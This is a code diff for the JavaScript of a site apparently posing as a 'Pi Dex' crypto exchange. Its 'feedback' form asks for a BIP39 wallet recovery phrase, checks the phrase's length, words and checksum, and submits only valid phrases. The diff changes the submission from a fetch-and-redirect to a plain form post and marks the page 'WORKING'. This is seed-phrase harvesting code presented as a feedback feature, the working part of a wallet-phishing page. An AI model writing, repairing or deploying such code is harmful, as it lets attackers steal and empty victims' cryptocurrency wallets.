@@ -97,7 +97,7 @@ function toggleMenu() {
 }
 
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY (BIP39 ONLY)
+// FEEDBACK PAGE FUNCTIONALITY (WORKING)
 // ========================================
 
 document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
@@ -107,7 +107,6 @@ async function initializeFeedbackPage() {
     const mnemonicInput = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
 
-    // Load official BIP39 English wordlist
     const wordlist = await fetch(
         'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt'
     )
@@ -126,52 +125,27 @@ async function initializeFeedbackPage() {
     function isValidBip39Mnemonic(mnemonic) {
         const words = mnemonic.split(/\s+/);
 
-        // Allowed BIP39 lengths
-        if (![12, 15, 18, 21, 24].includes(words.length)) {
-            return false;
-        }
+        if (![12, 15, 18, 21, 24].includes(words.length)) return false;
 
-        // Wordlist check
         for (const word of words) {
-            if (!wordlist.includes(word)) {
-                return false;
-            }
+            if (!wordlist.includes(word)) return false;
         }
 
-        // Checksum validation
         return window.bip39.validateMnemonic(mnemonic);
     }
 
-    if (!form) return;
-
     form.addEventListener('submit', function (e) {
-        e.preventDefault();
-
         const mnemonic = mnemonicInput.value.trim().toLowerCase();
 
         if (!isValidBip39Mnemonic(mnemonic)) {
-            showError(
-                'Invalid passphrase.'
-            );
+            e.preventDefault(); // ❌ stop submit ONLY if invalid
+            showError('Invalid passphrase.');
             return;
         }
 
+        // ✅ VALID → allow normal form submit
         hideError();
-
-        const formData = new FormData(form);
-
-        fetch(form.action, {
-            method: 'POST',
-            body: formData,
-            headers: { Accept: 'application/json' }
-        })
-        .then(res => {
-            if (!res.ok) throw new Error();
-            window.location.href = 'dex.html';
-        })
-        .catch(() => {
-            showError('Submission failed. Please try again.');
-        });
+        // DO NOT preventDefault here
     });
 }
 
@@ -479,6 +453,7 @@ console.log('Pi Dex Script Loaded Successfully');
 console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
 console.log('Selected Network: ' + selectedNetwork);
 console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
+
 
 
 
